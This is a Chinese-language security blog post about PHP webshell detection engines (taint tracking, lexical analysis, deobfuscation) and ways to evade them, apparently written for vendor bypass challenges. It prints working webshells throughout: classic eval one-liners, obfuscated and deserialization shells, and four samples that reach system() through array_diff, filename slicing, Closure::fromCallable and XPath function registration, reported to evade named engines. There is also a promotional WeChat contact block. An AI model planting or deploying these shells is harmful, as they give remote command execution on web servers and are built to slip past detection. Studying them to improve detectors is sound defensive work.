### 0x01 前言

最近很多家厂商都陆续开放了自己的Webshell检测引擎，并且公开接口，邀请众安全研究员参加尝试bypass检测引擎，并且给予奖励，我也参加了几场类似的活动，有
**ASRC** 的 **伏魔计划** ，也有 **TSRC** 的 **猎刃计划** ，还有最近正在进行的 **长亭** 的
**牧云（Aka.关山）Webshell检测引擎** ，如果你都参加或者关注了这三个比赛，你会发现他们都提到了以下几个技术：

    
    
    1、词法分析  
    2、污点追踪  
    3、恶意代码检测

这些新技术我们后面的章节中，我们先讲一下传统的Webshell检测机制，再对照着最新的Webshell检测技术来说明一下如何在新技术下做免杀Webshell（本文所有Webshell基于PHP语言）

### 0x02 传统Webshell检测

传统的Webshell检测技术主要依赖于字符串的正则特征，在面对于已知的样本可以做到高准确率检测，在长时间的样本收取下，也可以做到满足日常运维中的Webshell检测，举几个经典的Webshell样本

1、经典一句话Webshell

    
    
    <?php eval($_GET['cmd']);?>

2、反序列化Webshell

    
    
    <?php  
    Class H3{  
    function __destruct(){  
    eval($this->c);  
    }  
    }  
    $a= new H3;  
    $a->c = $_GET['cmd'];

3、无字母Webshell

    
    
    <?php  
    $_ = 97;  
    $__ = 97 + 18; //s  
    $___ = $__ + 6; //y  
    $____ = $__ + 1; //t  
    $_____ = $_ + 4; //e  
    $______ = $__ - 6; //m  
    ​  
    $res = chr($__).chr($___).chr($__).chr($____).chr($_____).chr($______);  
    $_= $_POST['cmd'];  
    $res($_);

但是对于当下的技术发展，黑客们可以更加精心的编写Webshell来"骗"过传统的Webshell检测机制，而且Webshell易变形，在面对0day样本的时候，传统Webshell检测就会效果欠佳，也就需要更加全面的手段来与其抗衡

### 0x03 新型Webshell检测

对于现如今的情况下，传统的Webshell检测对于0day样本的检测效率已经不是特别好了，所以这时候就需要一种"主动"的检测方式，能够让引擎主动去理解脚本、分析样本，发现样本中的恶意行为，而不是依靠人工来添加Webshell特征。

#### 1、污点追踪

举个例子，对于一个Webshell来说，如果要进行任意命令执行，就一定要获取外界数据，对于PHP来说也就是`$_GET`、`$_POST`来接受数据，而要想任意命令执行，这些接收到的数据也就一定要最终传递到`eval`、`system`等函数中，而
**污点追踪**
技术就是利用这一点，如果样本中的外界变量通过不断传递，最终进入到危险函数中，那基本上就可以断定为Webshell，将外界变量视为污点源，危险函数视为污点汇聚点，跟踪污点传播过程，判断污点变量是否被洗白，最终是否进入污点汇聚点，画一个流程图如下：

![污点追踪.png](https://image.3001.net/images/20220805/1659667372_62ec83acd417529c67b75.png!small)

#### 2、词法分析

检测引擎会将各种脚本语言进行词法语法分析，然后构建控制流图和数据流图，并在图上跟踪外界污点变量的传递，使用外界变量是WebShell非常重要的特征，如果发现外界变量最终进入了命令执行函数，就可以判断为Webshell。

![640.png](https://image.3001.net/images/20220805/1659667373_62ec83adbba52c00ac2e6.png!small)

引擎可以将传统的条件、循环、函数、对象的静态分析，目前还可以支持动态变量名、箭头函数、反射、回调等动态特性的分析，大大的强化的未知样本的检测成功率。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

#### 3、加密还原

在此之前我们的Webshell常用的绕过检测的方法就是通过加密来绕过，例子如下：

    
    
    <?php  
    $_=[];  
    $_=@"$_"; // $_='Array';  
    $_=$_['!'=='@']; // $_=$_[0];  
    $___=$_; // A  
    $__=$_;  
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;  
    $___.=$__; // S  
    $___.=$__; // S  
    $__=$_;  
    $__++;$__++;$__++;$__++; // E   
    $___.=$__;  
    $__=$_;  
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R  
    $___.=$__;  
    $__=$_;  
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T  
    $___.=$__;  
    $____='_';  
    $__=$_;  
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P  
    $____.=$__;  
    $__=$_;  
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O  
    $____.=$__;  
    $__=$_;  
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S  
    $____.=$__;  
    $__=$_;  
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T  
    $____.=$__;  
    ​  
    $_=$$____;  
    $___(base64_decode($_[_])); // ASSERT($_POST[_]);

该样本利用了混淆和加密两种技术，但是现如今的检测引擎都具备有对市面上的大部分PHP加密混淆进行“脱壳”和利用动态分析PHP执行器进行虚拟执行，将混淆加密的代码进行动态还原，解密后混淆和加密相当于明文传输，再利用污点追踪技术和动静态结合分析即可大大的提高检测率，并且能够有效减小误报率，同时也让这种在之前百试不爽的技巧无法使用。

### 0x04 如果Bypass掉新型检测引擎

我们要知道原理就可以想办法如何“蒙骗“住检测引擎，如果大家研究过，或者说亲身参与到了bypass挑战赛中，就能感受到无论是动静态还是什么技术，最后都是根据污点追踪法则来进行检测，污点追踪的流程在上一节提到了，目前我们有两个方法：

1、利用PHP中其他的命令执行的方法，让检测引擎识别不出这是污点汇集点

2、打断污点追踪的过程，让污点汇集点不落地

拿出一个样本我们来结合代码说明（以下样本分别bypass的引擎会标注出来，截止笔者写这篇的文章的时候只有牧云webshell检测引擎正在开启）

#### 样本1

    
    
    <?php  
    //ASRC伏魔引擎bypass  
    $result = array_diff(["s","a","b","ys","te","m"],["a","b"]);  
    $a = join($result);  
    array_map($a,(array)$_REQUEST['1']);  
    ?>

讲一下原理，首先我们需要利用技巧（PHP本身的特性），来阻断污点追踪的过程，我在fuzz测试的时候发现了`array_map()`这个函数存在`callback`并且能够逃避检测

![image-20220801175154343.png](https://image.3001.net/images/20220805/1659667374_62ec83ae94d6883fa23c2.png!small)

那么首先的能够bypass的污点汇集点已经有了，接下里来就是寻找其他函数来将变量"洗白"，我选择了`array_diff()`

![image-20220801174825422.png](https://image.3001.net/images/20220805/1659667375_62ec83af8c08f44307bbb.png!small)

这样就可以利用该函数拼凑出一个`system`函数，再利用`array_map()`的`callback`来做命令执行

结果如下：

![image-20220801175804957.png](https://image.3001.net/images/20220805/1659667376_62ec83b06ebc0716cffbe.png!small)

这样就完成了最简单的一次bypass

#### 样本2

    
    
    <?php  
    //bypass 牧云 文件名需要设置为system  
    $filename=substr(__FILE__,-10,6);  
    $command=$_POST[1];  
    $filename($command);

`__FILE__`是PHP的一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名，我们利用`substr()`函数逆着截取，就能获得`system`再利用变量做函数的方式，打断了污点追踪的过程，进行命令执行，也可以成功bypass掉牧云引擎。

结果如下：

![image-20220801210052872.png](https://image.3001.net/images/20220805/1659668046_62ec864e7673349f6637f.png!small)

牧云引擎检测结果如下：

![image-20220801210000827.png](https://image.3001.net/images/20220805/1659668047_62ec864f7fcd2c4f7cfc7.png!small)

  

#### 样本3

    
    
    <?php  
    //bypass 牧云 and TAV反病毒引擎+洋葱恶意代码检测引擎  
    class A{  
    public function __construct(){}  
    ​  
    public function __wakeup(){  
        $b = $_GET[1];  
        $result = array_diff(["s","a","b","ys","te","m"],["a","b"]);  
        $a = join($result);  
        Closure::fromCallable($a)->__invoke($_REQUEST[2]);  
    }  
    }  
    ​  
    @unserialize('O:1:"A":1:{s:10:" A comment";N;}');

这个套了一层反序列化，隐藏污点汇集点的方法与样本一相同，利用数组差级构造`system`后利用原生类`Closure`的`fromCallable`函数

![image-20220801213635370.png](https://image.3001.net/images/20220805/1659667377_62ec83b13162754bf6a5a.png!small)

进行命令执行（在牧云中`array_diff(["s","a","b","ys","te","m"],["a","b"]);`这种方式会被check，索性换成动态控制，这样也能打断污点追踪）

结果如下：

![image-20220801213944993.png](https://image.3001.net/images/20220805/1659667378_62ec83b200b67cd73d4d5.png!small)

![image-20220801214027664.png](https://image.3001.net/images/20220805/1659667378_62ec83b2bdd7f4c001af8.png!small)

![image-20220801214223486.png](https://image.3001.net/images/20220805/1659667379_62ec83b3bb6abbab089cd.png!small)

  

  

#### 样本4

    
    
    <?php  
    // dom and xml needed, install php-xml and leave php.ini as default.  
    // Author:LemonPrefect  
    $cmd = $_GET[3];  
    $_REQUEST[1] = "//book[php:functionString('system', '$cmd') = 'PHP']";  
    $_REQUEST[2] = ["php", "http://php.net/xpath"];  
    $xml = <<< XML  
    <?xml version="1.0" encoding="UTF-8"?>  
    <books>  
    <book>  
        <title>We are the champions</title>  
        <author>LemonPrefect</author>  
        <author>H3h3QAQ</author>  
    </book>  
    </books>  
    XML;  
    ​  
    $doc = new DOMDocument;  
    $doc->loadXML($xml);  
    $clazz = (new ReflectionClass("DOMXPath"));  
    $instance = $clazz->newInstance($doc);  
    $clazz->getMethod("registerNamespace")->getClosure($instance)->__invoke(...$_REQUEST[2]);  
    $clazz->getMethod("registerPHPFunctions")->invoke($instance);  
    $clazz->getMethod("query")->getClosure($instance)->__invoke($_REQUEST[1]);

该样本需要一些条件，前提是开启了`php-xml`拓展才可以，其原理就是用XML去注册一个`registerPHPFunctions`，也就是我们想要执行的`system`再利用`getClosure`去触发该方法而构成的webshell，其中即利用到了PHP的特性，利用`registerNamespace`和`registerPHPFunctions`来中断污点追踪，从而RCE

结果如下：

![image-20220801220915010.png](https://image.3001.net/images/20220805/1659667380_62ec83b4ab3c4e96d652a.png!small)

![image-20220801220929751.png](https://image.3001.net/images/20220805/1659667381_62ec83b56f6a3b6dc359e.png!small)

  

  

### 0x05 总结

在构造Webshell的时候，我们如果知道Webshell检测引擎原理，就知道如何去bypass了，对于怎样过掉Webshell引擎这件事，需要开动脑筋多去找一下PHP的文档，去找一下原生类和其他能够中断污点追踪的方法，让引擎跟踪不到你的行为，而且尽量不要让敏感字符串出现在代码本体，因为有的引擎还是有字符串的正则特征检测，同时也要学会分析，分析自己的Webshell到底哪里出的问题，从而找到更好的方法去替换。

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

